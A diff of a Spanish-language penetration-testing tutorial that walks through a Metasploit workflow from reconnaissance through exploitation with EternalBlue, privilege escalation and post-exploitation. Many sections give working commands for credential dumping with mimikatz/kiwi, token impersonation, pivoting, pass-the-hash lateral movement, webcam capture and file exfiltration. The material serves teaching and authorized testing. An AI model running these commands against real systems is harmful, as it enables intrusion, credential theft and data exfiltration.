@@ -347,27 +347,31 @@ Cada una de estas categorías tiene diferentes **subcategorías** destinadas a p
 
 ## 🗺️ Flowchart: Estructura Completa de Compromiso
 
-A continuación, desglosamos cada fase de la estructura de compromiso:
+A continuación, desglosamos cada fase de la estructura de compromiso basándonos en el diagrama oficial:
 
 ### 📌 Fase 1: ENUMERACIÓN
 
 ```
 ENUMERACIÓN
 ├── Service Validation (Validación de Servicios)
-│   ├── Passive Scanning
+│   ├── Passive Scanning (Escaneo Pasivo)
 │   │   ├── OSINT
 │   │   ├── Interacting with services legitimately
 │   │   └── whois / DNS records
-│   └── Active Scanning
-│       ├── nMap / Nessus / Nexpose scans
-│       ├── Web server identification tools
-│       └── Scan with identification tools
+│   │
+│   └── Active Scanning (Escaneo Activo)
+│       ├── nMap / Nessus / NexPose scans
+│       ├── Web service identification tools
+│       └── Built-with identification tools
 │
 └── Vulnerability Research (Investigación de Vulnerabilidades)
-    ├── ExploitDB (CVE)
-    ├── Rapid7 (CVE)
+    ├── VulnDB (GUI)
+    ├── Rapid7 (GUI)
     ├── SearchSploit (CLI)
-    └── Google Dorking (CVE)
+    └── Google Dorking (GUI)
+    
+    → Workflow: > search [vuln. name] → > use [index no.]
+    → Proceed to Preparation
 ```
 
 **Explicación detallada**:
@@ -375,50 +379,237 @@ ENUMERACIÓN
 #### Service Validation (Validación de Servicios)
 
 **Passive Scanning (Escaneo Pasivo)**:
-- **OSINT**: Recopilación de inteligencia de fuentes abiertas
-- **Interacción legítima**: Interactuar con servicios de forma normal
-- **whois/DNS**: Consultar registros públicos
+
+Técnicas que **no interactúan directamente** con el objetivo de forma intrusiva:
+
+- **OSINT (Open Source Intelligence)**: 
+  - Recopilación de información de fuentes públicas
+  - Redes sociales, registros públicos, sitios web
+  - Google Hacking, Shodan, Censys
+  
+- **Interacting with services legitimately**: 
+  - Interactuar con servicios de forma normal y legítima
+  - Navegar el sitio web como un usuario común
+  - Leer documentación pública
+  - Observar comportamientos sin generar alertas
+  
+- **whois / DNS records**: 
+  - Consultar registros de dominio (whois)
+  - Registros DNS (A, MX, TXT, etc.)
+  - Información de contacto y organización
+  - Subdominios y registros históricos
 
 **Active Scanning (Escaneo Activo)**:
-- **nMap**: Escaneo de puertos y servicios
-- **Nessus/Nexpose**: Escáneres de vulnerabilidades profesionales
-- **Web identification tools**: Herramientas como WhatWeb, Wappalyzer
+
+Técnicas que **interactúan directamente** con el objetivo:
+
+- **nMap / Nessus / NexPose scans**: 
+  - **nMap**: Escaneo de puertos y detección de servicios
+  - **Nessus**: Escáner de vulnerabilidades comercial
+  - **NexPose**: Escáner de vulnerabilidades de Rapid7
+  - Detección de versiones de software
+  - Fingerprinting de sistemas operativos
+  
+- **Web service identification tools**: 
+  - Identificación del servidor web (Apache, Nginx, IIS)
+  - Detección de versiones específicas
+  - Headers HTTP reveladores
+  - Tecnologías de backend
+  
+- **Built-with identification tools**: 
+  - **BuiltWith**: Identifica tecnologías usadas en sitios web
+  - **Wappalyzer**: Extensión de navegador para detección de tecnologías
+  - **WhatWeb**: Herramienta CLI para identificar CMS, frameworks, librerías
+  - Detecta: CMS (WordPress, Joomla), frameworks (React, Laravel), CDNs, analytics
 
 #### Vulnerability Research (Investigación de Vulnerabilidades)
 
-**Bases de datos de exploits**:
-- **ExploitDB**: Base de datos pública de exploits (CVE)
-- **Rapid7**: Base de datos de Metasploit
-- **SearchSploit**: Herramienta CLI para buscar en ExploitDB
-- **Google Dorking**: Búsqueda avanzada de CVEs
+**Bases de datos de exploits y vulnerabilidades**:
+
+- **VulnDB (GUI)**: 
+  - Base de datos de vulnerabilidades con interfaz gráfica
+  - Información detallada de CVEs
+  - Exploits disponibles y PoCs
+  
+- **Rapid7 (GUI)**: 
+  - Base de datos de Metasploit
+  - Módulos verificados y mantenidos
+  - Interfaz web para búsqueda
+  
+- **SearchSploit (CLI)**: 
+  - Herramienta de línea de comandos
+  - Busca en la base de datos de Exploit-DB
+  - Rápida y eficiente para terminal
+  
+  ```bash
+  searchsploit apache 2.4.29
+  searchsploit -m 12345  # Copiar exploit
+  ```
+  
+- **Google Dorking (GUI)**: 
+  - Búsqueda avanzada en Google
+  - Operadores especiales para encontrar CVEs
+  - Descubrimiento de información sensible expuesta
+  
+  ```
+  site:exploit-db.com "Apache 2.4.29"
+  inurl:exploit filetype:rb
+  ```
+
+**Workflow de Metasploit**:
+
+Una vez identificada una vulnerabilidad:
+
+```bash
+# Buscar el módulo por nombre de vulnerabilidad
+msf6 > search [vuln. name]
+
+# Ejemplo
+msf6 > search eternal blue
+
+# Usar el módulo por su índice
+msf6 > use [index no.]
+
+# Ejemplo
+msf6 > use 0
+```
+
+**Transición**: Una vez identificado el exploit apropiado → **Proceed to Preparation**
 
 ### 📌 Fase 2: PREPARACIÓN
 
 ```
 PREPARACIÓN
 ├── Code Auditing (Auditoría de Código)
-│   └── Dependency Chains (Cadenas de Dependencias)
-│
-├── Reporting Custom Modules (Módulos Personalizados)
-│
-└── Required to Exploitation (Requerido para Explotación)
+├── Dependency Check (Verificación de Dependencias)
+└── Importing Custom Modules (Importación de Módulos Personalizados)
+    
+    → Proceed to Exploitation
 ```
 
 **Explicación detallada**:
 
 #### Code Auditing (Auditoría de Código)
-- Revisar el código del exploit antes de ejecutarlo
-- Entender las **dependencias** necesarias
-- Verificar que no haya comportamientos maliciosos
 
-#### Reporting Custom Modules
-- Crear módulos personalizados si es necesario
-- Adaptar exploits públicos a nuestro entorno
+**Propósito**: Revisar el código del exploit antes de ejecutarlo
 
-#### Required to Exploitation
-- Preparar el entorno de explotación
-- Configurar listeners
-- Preparar payloads
+**Qué verificar**:
+- ✅ Leer el código fuente del módulo
+- ✅ Entender qué hace exactamente el exploit
+- ✅ Identificar posibles efectos secundarios
+- ✅ Verificar que no contenga código malicioso
+- ✅ Comprender el mecanismo de explotación
+
+**Ejemplo de auditoría**:
+```bash
+# Ver la ubicación del módulo
+msf6 exploit(windows/smb/ms17_010_eternalblue) > info
+
+# Editar y revisar el código
+nano /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb
+```
+
+**Preguntas a responder**:
+- ¿Qué hace este exploit exactamente?
+- ¿Puede causar daño al sistema objetivo?
+- ¿Deja rastros o logs evidentes?
+- ¿Es estable o puede causar crashes?
+
+#### Dependency Check (Verificación de Dependencias)
+
+**Propósito**: Asegurar que todas las dependencias necesarias estén presentes
+
+**Qué verificar**:
+- ✅ Librerías de Ruby requeridas
+- ✅ Herramientas externas necesarias
+- ✅ Versiones compatibles de software
+- ✅ Permisos y privilegios necesarios
+- ✅ Conectividad de red requerida
+
+**Ejemplo**:
+```bash
+# Verificar dependencias de un módulo
+msf6 exploit(windows/smb/ms17_010_eternalblue) > check
+
+# Instalar gemas de Ruby si es necesario
+gem install <nombre_gema>
+```
+
+**Dependencias comunes**:
+- Gemas de Ruby específicas
+- Binarios del sistema (nmap, john, etc.)
+- Librerías de sistema (libssl, libpcap, etc.)
+- Python y módulos Python
+
+#### Importing Custom Modules (Importación de Módulos Personalizados)
+
+**Propósito**: Cargar exploits personalizados o modificados en Metasploit
+
+**Proceso de importación**:
+
+1. **Ubicar el directorio correcto**:
+```bash
+# Módulos de usuario
+~/.msf4/modules/
+
+# O módulos del sistema
+/usr/share/metasploit-framework/modules/
+```
+
+2. **Copiar el módulo**:
+```bash
+# Copiar exploit personalizado
+cp mi_exploit.rb ~/.msf4/modules/exploits/custom/
+
+# Estructura de carpetas
+mkdir -p ~/.msf4/modules/exploits/custom/
+```
+
+3. **Recargar módulos en msfconsole**:
+```bash
+msf6 > reload_all
+[*] Reloading modules from all module paths...
+```
+
+4. **Verificar que se cargó**:
+```bash
+msf6 > search custom
+```
+
+**Ejemplo de módulo personalizado**:
+```ruby
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Mi Exploit Personalizado',
+      'Description'    => %q{
+        Descripción de lo que hace el exploit
+      },
+      'Author'         => [ 'Tu Nombre' ],
+      'License'        => MSF_LICENSE,
+      'Platform'       => 'win',
+      'Targets'        => [
+        [ 'Windows XP SP3', { 'Ret' => 0x77c35459 } ]
+      ],
+      'DefaultTarget'  => 0
+    ))
+  end
+
+  def exploit
+    # Código de explotación
+    connect
+    sock.put(payload.encoded)
+    handler
+    disconnect
+  end
+end
+```
+
+**Transición**: Una vez preparado el entorno → **Proceed to Exploitation**
 
 ### 📌 Fase 3: EXPLOTACIÓN
 
@@ -426,164 +617,577 @@ PREPARACIÓN
 EXPLOTACIÓN
 ├── Run Module Locally (Ejecutar Módulo Localmente)
 │
-├── Get Payloads? (¿Obtener Payloads?)
-│   ├── Payloads shown selected
-│   │   ├── REVERSE
-│   │   ├── BIND/NETCAT
-│   │   ├── LOADLIBRARY
-│   │   ├── PASSIVESX
-│   │   ├── IPKNOCKING
-│   │   └── FIND_TAG
-│   │
-│   └── Targets shown selected
-│       ├── METERPRETER
-│       ├── Shell - CMD.shell.d
-│       ├── ... (otros shells)
-│       ├── VNC
-│       ├── WINDOWS
-│       ├── ENCODER
-│       └── OTHERS
-│
-└── Next Target (Siguiente Objetivo)
+└── Set Parameters (Establecer Parámetros)
+    │
+    ├── Options (> show options)
+    │   ├── URI
+    │   ├── PROXIES
+    │   ├── RHOST / RPORT
+    │   ├── USERNAMES
+    │   ├── PASSWORDS
+    │   ├── DICTIONARIES
+    │   └── SESSION
+    │   
+    │   → > set [option] [value]
+    │
+    ├── Payloads (> show payloads)
+    │   ├── METERPRETER
+    │   ├── SHELL BINDS
+    │   ├── REVERSE SHELLS
+    │   └── EXE
+    │   
+    │   → > set payload [index no.]
+    │
+    ├── Targets (> show targets)
+    │   ├── LINUX
+    │   ├── WINDOWS
+    │   ├── MACOSX
+    │   └── OTHERS
+    │   
+    │   → > set target [OS]
+    │
+    └── Run (Ejecutar)
+        → Loop back to beginning or continue
 ```
 
 **Explicación detallada**:
 
 #### Run Module Locally (Ejecutar Módulo Localmente)
-- Prueba del exploit antes del ataque real
-- Verificación de funcionamiento
 
-#### Get Payloads? (Selección de Payloads)
+**Propósito**: Prueba del exploit antes del ataque real
 
-**Tipos de conexión (Payloads shown selected)**:
+**Razones para ejecutar localmente**:
+- ✅ Verificar que el módulo funcione correctamente
+- ✅ Probar en un entorno controlado
+- ✅ Evitar exponer al cliente a exploits no probados
+- ✅ Validar payloads y configuraciones
 
-- **REVERSE**: Conexión inversa (el objetivo se conecta a nosotros)
-  ```
-  Objetivo → Atacante
-  ```
+**Ejemplo**:
+```bash
+# Configurar para prueba local
+msf6 exploit(multi/handler) > set LHOST 127.0.0.1
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > exploit
+```
+
+#### Set Parameters (Establecer Parámetros)
+
+Esta fase implica configurar todos los parámetros necesarios antes de ejecutar el exploit.
+
+##### 1. **Options (> show options)**
+
+**Comando para ver opciones**:
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+```
+
+**Parámetros comunes**:
+
+- **URI**: 
+  - Ruta específica en el servidor web objetivo
+  - Ejemplo: `/admin/login.php`
+  - Usado en exploits de aplicaciones web
   
-- **BIND/NETCAT**: Conexión directa (nosotros nos conectamos al objetivo)
-  ```
-  Atacante → Objetivo
-  ```
+- **PROXIES**: 
+  - Configuración de proxy para enrutar el ataque
+  - Formato: `type:host:port`
+  - Ejemplo: `socks5:127.0.0.1:9050` (Tor)
+  - Útil para anonimato o bypass de restricciones
   
-- **LOADLIBRARY**: Carga de bibliotecas dinámicas
-- **PASSIVESX**: Conexiones pasivas
-- **IPKNOCKING**: Port knocking antes de conexión
-- **FIND_TAG**: Búsqueda de tags específicos
+- **RHOST / RPORT**: 
+  - **RHOST**: Remote Host (IP o hostname del objetivo)
+  - **RPORT**: Remote Port (puerto del servicio vulnerable)
+  - Ejemplos: 
+    ```bash
+    set RHOST 192.168.1.100
+    set RPORT 445  # SMB
+    ```
+  
+- **USERNAMES**: 
+  - Nombre(s) de usuario para autenticación
+  - Puede ser un solo usuario o una lista
+  - Usado en ataques de fuerza bruta
+  
+- **PASSWORDS**: 
+  - Contraseña(s) para probar
+  - Puede ser una lista (diccionario)
+  - Usado en ataques de fuerza bruta
+  
+- **DICTIONARIES**: 
+  - Ruta a archivos de diccionario
+  - Wordlists para ataques de fuerza bruta
+  - Ejemplo: `/usr/share/wordlists/rockyou.txt`
+  
+- **SESSION**: 
+  - ID de sesión existente para usar
+  - Útil en post-explotación
+  - Permite usar sesiones ya establecidas
 
-**Targets shown selected (Tipos de shell)**:
+**Establecer opciones**:
+```bash
+# Sintaxis general
+> set [option] [value]
 
-- **METERPRETER**: Shell avanzado de Metasploit
-  - Post-explotación integrada
-  - Evasión de antivirus
-  - Funcionalidades extendidas
+# Ejemplos prácticos
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.10.40
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RPORT 445
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15
+```
 
-- **Shell - CMD.shell.d**: Shell estándar de comandos
-  - Windows: cmd.exe
-  - Linux: /bin/bash
+##### 2. **Payloads (> show payloads)**
 
-- **VNC**: Acceso gráfico remoto
-- **WINDOWS**: Payloads específicos de Windows
-- **ENCODER**: Payloads codificados para evasión
-- **OTHERS**: Otros tipos de payloads especializados
+**Comando para ver payloads disponibles**:
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
+```
+
+**Tipos de payloads**:
+
+- **METERPRETER**: 
+  - Shell avanzado de Metasploit
+  - Funciona en memoria (sin escribir en disco)
+  - Módulos de post-explotación integrados
+  - Comandos avanzados: hashdump, screenshot, webcam, keylogger
+  - Migración entre procesos
+  - Ejemplo: `windows/x64/meterpreter/reverse_tcp`
+  
+- **SHELL BINDS**: 
+  - Shell que escucha en el objetivo (bind)
+  - El atacante se conecta al objetivo
+  - Menos común debido a firewalls
+  - Útil cuando no hay restricciones de firewall saliente
+  - Ejemplo: `windows/shell/bind_tcp`
+  
+- **REVERSE SHELLS**: 
+  - Shell que se conecta desde el objetivo al atacante
+  - Más común, bypasea firewalls salientes
+  - El objetivo inicia la conexión
+  - Ejemplo: `windows/shell/reverse_tcp`
+  
+- **EXE**: 
+  - Payload como ejecutable standalone
+  - Archivo .exe que puede ejecutarse independientemente
+  - Útil para ataques de ingeniería social
+  - Ejemplo: `windows/meterpreter/reverse_tcp` generado como .exe
+
+**Establecer payload**:
+```bash
+# Sintaxis
+> set payload [index no.]
+
+# O por nombre completo
+> set payload windows/x64/meterpreter/reverse_tcp
+```
+
+**Comparación de payloads**:
+
+| Tipo | Ventajas | Desventajas | Uso Recomendado |
+|------|----------|-------------|-----------------|
+| **Meterpreter** | Funcionalidad completa, en memoria | Más detectable por AV | Post-explotación avanzada |
+| **Shell Reverse** | Simple, ligero | Funcionalidad limitada | Acceso rápido básico |
+| **Shell Bind** | No requiere listener externo | Bloqueado por firewalls | Redes sin firewall |
+| **EXE** | Standalone, portable | Requiere ejecución manual | Ingeniería social |
+
+##### 3. **Targets (> show targets)**
+
+**Comando para ver targets disponibles**:
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show targets
+```
+
+**Sistemas operativos objetivo**:
+
+- **LINUX**: 
+  - Distribuciones Linux (Ubuntu, CentOS, Debian, etc.)
+  - Diferentes versiones de kernel
+  - Arquitecturas: x86, x64, ARM
+  
+- **WINDOWS**: 
+  - Versiones de Windows (XP, 7, 8, 10, 11, Server)
+  - Diferentes service packs
+  - Arquitecturas: x86, x64
+  - Ejemplos: 
+    ```
+    Windows 7 SP1 x64
+    Windows Server 2012 R2
+    Windows 10 Build 1909
+    ```
+  
+- **MACOSX**: 
+  - Versiones de macOS / Mac OS X
+  - Diferentes arquitecturas (Intel, M1/M2)
+  
+- **OTHERS**: 
+  - Sistemas operativos menos comunes
+  - Dispositivos embebidos
+  - Routers, IoT devices
+  - Sistemas Unix propietarios
+
+**Establecer target**:
+```bash
+# Sintaxis
+> set target [OS]
+
+# Ejemplos
+> set target 0  # Por índice
+> set target Windows 7 SP1 x64  # Por nombre
+```
+
+**¿Por qué es importante el target?**
+- Cada sistema operativo tiene diferentes offsets de memoria
+- Diferentes métodos de explotación según arquitectura
+- Shellcode específico para cada plataforma
+- Exploit puede fallar si el target es incorrecto
+
+##### 4. **Run (Ejecutar)**
+
+**Comandos de ejecución**:
+
+```bash
+# Ejecutar el exploit
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+
+# O usar 'run' (equivalente)
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+# Ejecutar como job en background
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -j
+
+# Ejecutar sin verificar sesión
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z
+```
+
+**Flujo después de Run**:
+
+```
+Run → ¿Exploit exitoso?
+       ├── SÍ → Sesión establecida → Post-Explotación
+       └── NO → Volver al inicio
+                ├── Revisar configuración
+                ├── Probar otro payload
+                ├── Verificar target correcto
+                └── Buscar otro exploit
+```
 
 ### 📌 Fase 4: ESCALADA DE PRIVILEGIOS
 
 ```
 PRIVILEGE ESCALATION (ESCALADA DE PRIVILEGIOS)
 ├── Vulnerability Research (Investigación de Vulnerabilidades)
-│   └── Already privileged to access
-│       └── what privilege is needed
 │
 ├── Credential Gathering (Recolección de Credenciales)
 │
 └── Token Impersonation (Suplantación de Tokens)
+
+    → Return to Enumeration, repeat until highest privilege obtained
+    → (Volver a Enumeración, repetir hasta obtener máximo privilegio)
 ```
 
 **Explicación detallada**:
 
-#### Vulnerability Research
-- Buscar vulnerabilidades de escalada de privilegios
-- Identificar qué privilegios ya tenemos
-- Determinar qué privilegios necesitamos
+#### Vulnerability Research (Investigación de Vulnerabilidades)
 
-**Ejemplo**:
+**Propósito**: Buscar vulnerabilidades de escalada de privilegios en el sistema comprometido
+
+**Proceso de investigación**:
+
+1. **Identificar privilegios actuales**:
+```bash
+# En Windows
+whoami
+whoami /priv
+
+# En Linux
+id
+sudo -l
 ```
-Usuario actual: www-data (bajos privilegios)
-Objetivo: root (máximos privilegios)
-Método: Exploit de kernel o SUID binaries
+
+2. **Enumerar el sistema**:
+```bash
+# En Meterpreter
+meterpreter > sysinfo
+meterpreter > getuid
+
+# Versión del sistema operativo
+meterpreter > run post/windows/gather/enum_patches
 ```
+
+3. **Buscar exploits locales**:
+```bash
+# En msfconsole
+msf6 > search platform:windows type:exploit local
+
+# Buscar por versión específica
+msf6 > search windows 10 privilege escalation
+```
+
+**Ejemplos de vulnerabilidades comunes**:
+
+| Sistema | Vulnerabilidad | Técnica |
+|---------|---------------|---------|
+| Windows | MS16-032 | Secondary Logon Handle Privilege Escalation |
+| Windows | PrintSpoofer | Print Spooler Service Abuse |
+| Linux | DirtyCow | Kernel Exploit (CVE-2016-5195) |
+| Linux | SUID Binaries | Binarios con permisos SUID mal configurados |
+
+**Nota importante**: La imagen menciona **"Return to Enumeration"** - esto significa que si no logramos escalar privilegios, debemos volver a enumerar el sistema más profundamente.
 
 #### Credential Gathering (Recolección de Credenciales)
-- Extraer contraseñas de archivos de configuración
-- Dump de hashes de contraseñas
-- Captura de credenciales en memoria
-- Keylogging
 
-**Herramientas comunes**:
-- mimikatz (Windows)
-- hashdump (Meterpreter)
-- /etc/shadow (Linux)
+**Propósito**: Obtener credenciales que puedan tener mayores privilegios
+
+**Técnicas de recolección**:
+
+1. **Dump de hashes de contraseñas**:
+```bash
+# En Meterpreter (Windows)
+meterpreter > hashdump
+meterpreter > run post/windows/gather/smart_hashdump
+
+# Extraer credenciales de memoria
+meterpreter > load kiwi
+meterpreter > creds_all
+```
+
+2. **Buscar contraseñas en archivos**:
+```bash
+# Archivos de configuración
+meterpreter > search -f config.php
+meterpreter > search -f web.config
+meterpreter > search -f unattend.xml
+
+# Credenciales en registro (Windows)
+meterpreter > run post/windows/gather/credentials/windows_autologin
+```
+
+3. **Credenciales en memoria**:
+```bash
+# Mimikatz a través de Meterpreter
+meterpreter > load kiwi
+meterpreter > kiwi_cmd privilege::debug
+meterpreter > kiwi_cmd sekurlsa::logonpasswords
+```
+
+4. **Archivos de navegadores**:
+```bash
+# Credenciales guardadas en navegadores
+meterpreter > run post/multi/gather/firefox_creds
+meterpreter > run post/windows/gather/enum_chrome
+```
+
+**Fuentes comunes de credenciales**:
+
+- 📁 **Archivos de configuración**: `config.php`, `.env`, `web.config`
+- 🔑 **Registro de Windows**: Autologin, VNC, etc.
+- 💾 **Bases de datos locales**: SQLite, archivos de configuración de DB
+- 🌐 **Navegadores**: Contraseñas guardadas, cookies de sesión
+- 📝 **Archivos de texto**: Notas, documentos con credenciales
+- 🗃️ **Historial de comandos**: `.bash_history`, PowerShell history
 
 #### Token Impersonation (Suplantación de Tokens)
-- Robo de tokens de autenticación
-- Impersonar usuarios con mayores privilegios
-- Técnicas como Pass-the-Hash
+
+**Propósito**: Robar tokens de autenticación de procesos con mayores privilegios
+
+**Concepto**: En Windows, cada proceso tiene un **token de acceso** que define sus privilegios. Podemos "robar" tokens de procesos que corren con mayores privilegios.
+
+**Técnicas**:
+
+1. **Listar tokens disponibles**:
+```bash
+# En Meterpreter
+meterpreter > use incognito
+meterpreter > list_tokens -u
+
+# Salida ejemplo:
+Delegation Tokens Available
+========================================
+NT AUTHORITY\SYSTEM
+DOMAIN\Administrator
+```
+
+2. **Suplantar un token**:
+```bash
+# Impersonar token de SYSTEM
+meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
+
+# Verificar privilegios
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+3. **Migrar a proceso privilegiado**:
+```bash
+# Listar procesos
+meterpreter > ps
+
+# Migrar a un proceso de SYSTEM
+meterpreter > migrate 1234
+```
+
+**Privilegios requeridos**:
+- `SeImpersonatePrivilege`
+- `SeAssignPrimaryTokenPrivilege`
+
+**Exploits comunes de Token Impersonation**:
+- **Juicy Potato**: Explotación de SeImpersonate en Windows
+- **Rotten Potato**: Versión antigua
+- **PrintSpoofer**: Abuse del servicio Print Spooler
+
+**Ciclo de repetición**:
+
+> **"Return to Enumeration, repeat until highest privilege obtained"**
+
+Si después de intentar escalar privilegios no obtenemos el nivel deseado (generalmente SYSTEM en Windows o root en Linux), debemos:
+
+1. ↩️ **Volver a Enumeración**
+2. 🔍 Buscar información que nos hayamos perdido
+3. 🔄 Intentar otra técnica de escalada
+4. ♻️ Repetir el ciclo hasta obtener **máximos privilegios**
 
 ### 📌 Fase 5: POST-EXPLOTACIÓN
 
 ```
 POST-EXPLOITATION (POST-EXPLOTACIÓN)
 ├── Pivoting to Other Systems (Pivoteo a Otros Sistemas)
-│   └── Use target to attack other machines
 │
 ├── Credential Gathering (Recolección de Credenciales)
-│   └── For lateral movement
 │
 ├── Data Exfiltration (Exfiltración de Datos)
-│   └── Extract valuable information
 │
 └── Cleanup (Limpieza)
-    └── Remove traces of activity
 ```
 
 **Explicación detallada**:
 
-#### Pivoting to Other Systems (Pivoteo)
-**Concepto**: Usar el sistema comprometido como **punto de apoyo** para atacar otros sistemas en la red interna.
+#### Pivoting to Other Systems (Pivoteo a Otros Sistemas)
+
+**Propósito**: Usar el sistema comprometido como **trampolín** para atacar otros sistemas en la red interna
+
+**Concepto**: El pivoting nos permite alcanzar sistemas que no son accesibles directamente desde nuestra máquina atacante.
 
 **Escenario típico**:
 ```
-Internet → [Sistema Web Comprometido] → Red Interna
-                    ↓
-            Base de Datos Interna
-            Servidor de Archivos
-            Controlador de Dominio
+Internet
+   ↓
+[Firewall] 
+   ↓
+Sistema Web Comprometido (DMZ) ← Tenemos acceso aquí
+   ↓
+[Red Interna] ← NO accesible desde Internet
+   ├── Base de Datos
+   ├── Servidor de Archivos  
+   ├── Controlador de Dominio
+   └── Estaciones de Trabajo
 ```
 
-**Técnicas**:
-- Port forwarding
-- Proxy SOCKS
-- VPN tunneling
-- Route addition en Meterpreter
+**Técnicas de pivoting en Metasploit**:
+
+1. **Agregar ruta (Route)**:
+```bash
+# En Meterpreter
+meterpreter > run autoroute -s 192.168.100.0/24
+
+# Ver rutas configuradas
+meterpreter > run autoroute -p
+```
+
+2. **Port Forwarding**:
+```bash
+# Reenviar puerto 3389 del objetivo a nuestro puerto local
+meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.100.10
+
+# Ahora podemos conectarnos localmente
+rdesktop 127.0.0.1:3389
+```
+
+3. **Proxy SOCKS**:
+```bash
+# Iniciar servidor SOCKS
+msf6 > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > set VERSION 4a
+msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
+msf6 auxiliary(server/socks_proxy) > run -j
+
+# Configurar proxychains
+nano /etc/proxychains.conf
+# Agregar: socks4 127.0.0.1 1080
+
+# Usar con cualquier herramienta
+proxychains nmap 192.168.100.10
+```
+
+4. **Túneles SSH**:
+```bash
+# Desde Meterpreter, subir chisel o similar
+meterpreter > upload chisel.exe C:\\Windows\\Temp\\
+
+# Crear túnel reverso
+```
+
+**Workflow de pivoting**:
+```
+1. Comprometer Sistema A (DMZ)
+2. Enumerar red interna desde Sistema A
+3. Configurar pivoting (autoroute/portfwd/socks)
+4. Escanear red interna a través de Sistema A
+5. Explotar Sistema B en red interna
+6. Repetir proceso si es necesario
+```
 
 #### Credential Gathering (Recolección de Credenciales)
 
-**Propósito**: Obtener credenciales para **movimiento lateral**
+**Propósito**: Obtener credenciales para **movimiento lateral** a otros sistemas
 
-**Fuentes de credenciales**:
-- Archivos de configuración
-- Memoria del sistema
-- Navegadores web
-- Gestores de contraseñas
-- Bases de datos locales
+**Diferencia con Fase 4**: Aquí las credenciales se usan para acceder a OTROS sistemas, no para escalar en el sistema actual.
 
-**Ejemplo**:
+**Técnicas**:
+
+1. **Extracción de credenciales del sistema**:
 ```bash
-# En Meterpreter
+# Hashes de contraseñas
 meterpreter > hashdump
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+# Credenciales en texto plano (Mimikatz)
+meterpreter > load kiwi
+meterpreter > creds_msv
+meterpreter > creds_wdigest
+```
+
+2. **Buscar credenciales almacenadas**:
+```bash
+# Scripts guardados
+meterpreter > search -f *.ps1
+meterpreter > search -f *.bat
+
+# Historial de comandos
+meterpreter > cat C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
+```
+
+3. **Credenciales de servicios**:
+```bash
+# Credenciales de servicios Windows
+meterpreter > run post/windows/gather/credentials/credential_collector
+
+# Llaves SSH privadas
+meterpreter > search -f id_rsa
+meterpreter > search -f *.pem
+```
+
+4. **Kerberoasting** (en entornos Active Directory):
+```bash
+# Solicitar tickets de servicio
+meterpreter > load kiwi
+meterpreter > kerberos::list /export
+```
+
+**Uso para movimiento lateral**:
+```bash
+# Una vez obtenidas credenciales, usarlas en otros sistemas
+msf6 > use exploit/windows/smb/psexec
+msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
+msf6 exploit(windows/smb/psexec) > set SMBPass <hash_obtenido>
+msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.100.10
+msf6 exploit(windows/smb/psexec) > exploit
 ```
 
 #### Data Exfiltration (Exfiltración de Datos)
@@ -591,43 +1195,134 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08
 **Propósito**: Extraer información valiosa del sistema comprometido
 
 **Tipos de datos objetivo**:
-- 📄 Documentos confidenciales
-- 🔑 Credenciales almacenadas
-- 💾 Bases de datos
-- 📧 Correos electrónicos
-- 🔒 Claves privadas (SSH, SSL)
-- 💰 Información financiera
-- 👤 Datos personales (PII)
+
+| Tipo | Ejemplos | Ubicaciones Comunes |
+|------|----------|---------------------|
+| **Documentos** | PDFs, DOC, XLS | Desktop, Documents, compartidos de red |
+| **Credenciales** | Passwords, hashes | Archivos config, memoria, registro |
+| **Bases de Datos** | SQL dumps, SQLite | Directorios de aplicaciones web |
+| **Código Fuente** | Proyectos, scripts | Repositorios git, carpetas de desarrollo |
+| **Correos** | PST, EML | Outlook data files |
+| **Llaves Privadas** | SSH, SSL/TLS | .ssh/, certificados |
+| **Información Personal** | PII, datos financieros | Bases de datos, documentos |
 
 **Métodos de exfiltración**:
-- Download directo vía Meterpreter
-- Compresión y transferencia
-- Tunelización por DNS
-- Exfiltración por HTTPS
 
-**Ejemplo**:
+1. **Download directo via Meterpreter**:
 ```bash
-# En Meterpreter
+# Descargar archivo individual
 meterpreter > download "C:\\Users\\Admin\\Documents\\passwords.txt" /root/loot/
+
+# Descargar carpeta completa
+meterpreter > download "C:\\Users\\Admin\\Documents\\" /root/loot/ -r
 ```
+
+2. **Compresión antes de transferir**:
+```bash
+# Comprimir datos en el objetivo
+meterpreter > execute -f cmd.exe -a "/c powershell Compress-Archive C:\\sensitive\\* C:\\temp\\data.zip" -H
+
+# Descargar archivo comprimido
+meterpreter > download C:\\temp\\data.zip /root/loot/
+```
+
+3. **Exfiltración por canales alternativos**:
+```bash
+# Túnel DNS
+# Túnel HTTPS
+# Esteganografía en imágenes
+# Transferencia fragmentada
+```
+
+4. **Captura de screenshots/webcam** (para datos visuales):
+```bash
+# Screenshot
+meterpreter > screenshot
+
+# Webcam
+meterpreter > webcam_snap
+meterpreter > webcam_stream
+```
+
+**Consideraciones importantes**:
+- ⚠️ **Legalidad**: Solo exfiltrar datos autorizados en el alcance
+- 🔒 **Cifrado**: Cifrar datos sensibles durante transferencia
